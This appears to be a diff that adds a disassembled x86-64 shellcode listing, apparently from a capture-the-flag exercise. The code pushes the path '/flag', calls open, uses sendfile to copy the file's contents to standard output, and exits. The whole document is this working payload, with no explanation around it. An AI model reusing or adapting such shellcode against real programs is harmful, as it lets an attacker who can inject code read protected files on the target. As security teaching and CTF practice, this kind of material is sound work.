@@ -1,0 +1,16 @@
+   0:   48 31 c0                xor    rax, rax
+   3:   48 bb 2f 66 6c 61 67    movabs rbx, 0x67616c662f
+   a:   00 00 00 
+   d:   53                      push   rbx
+   e:   48 c7 c0 02 00 00 00    mov    rax, 0x2
+  15:   48 89 e7                mov    rdi, rsp
+  18:   48 c7 c6 00 00 00 00    mov    rsi, 0x0
+  1f:   0f 05                   syscall 
+  21:   48 c7 c7 01 00 00 00    mov    rdi, 0x1
+  28:   48 89 c6                mov    rsi, rax
+  2b:   48 c7 c2 00 00 00 00    mov    rdx, 0x0
+  32:   49 c7 c2 e8 03 00 00    mov    r10, 0x3e8
+  39:   48 c7 c0 28 00 00 00    mov    rax, 0x28
+  40:   0f 05                   syscall 
+  42:   48 c7 c0 3c 00 00 00    mov    rax, 0x3c
+  49:   0f 05                   syscall
